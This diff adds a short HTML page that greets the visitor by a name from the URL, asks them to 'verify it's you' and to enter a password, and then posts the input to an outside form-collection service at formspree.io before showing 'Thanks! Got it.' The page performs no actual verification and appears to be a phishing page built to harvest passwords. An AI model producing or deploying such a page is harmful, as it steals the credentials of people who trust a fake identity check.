@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Welcome</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #e6fcf5; text-align: center; padding: 40px 20px; }
+    h1 { color: #0b7285; }
+    textarea { padding: 12px; font-size: 16px; border: 2px solid #0b7285; border-radius: 8px; width: 80%; max-width: 400px; margin-bottom: 15px; font-family: Arial, sans-serif; }
+    button { background: #0b7285; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; }
+    a { display: inline-block; margin-top: 20px; background: #0b7285; color: white; text-decoration: none; padding: 12px 24px; border-radius: 8px; }
+    #result { margin-top: 20px; font-size: 18px; color: #333; }
+  </style>
+</head>
+<body>
+  <h1 id="title">Hello!</h1>
+  <p>verify it's you </p>
+
+  <form id="myForm">
+    <textarea name="message" id="nameBox2" rows="5" placeholder="enter password"></textarea>
+    <br>
+    <button type="submit">Submit</button>
+  </form>
+  <p id="result"></p>
+
+  <a href="index.html">Go back</a>
+
+  <script>
+    var params = new URLSearchParams(window.location.search);
+    var name = params.get("name");
+    if (name) {
+      document.getElementById("title").innerText = "Hello, " + name + "! ";
+    }
+
+    document.getElementById("myForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      fetch("https://formspree.io/f/mjywlavq", {
+        method: "POST",
+        headers: { "Accept": "application/json" },
+        body: new FormData(e.target)
+      }).then(function() {
+        document.getElementById("result").innerText = "Thanks! Got it.";
+      });
+    });
+  </script>
+</body>
+</html>
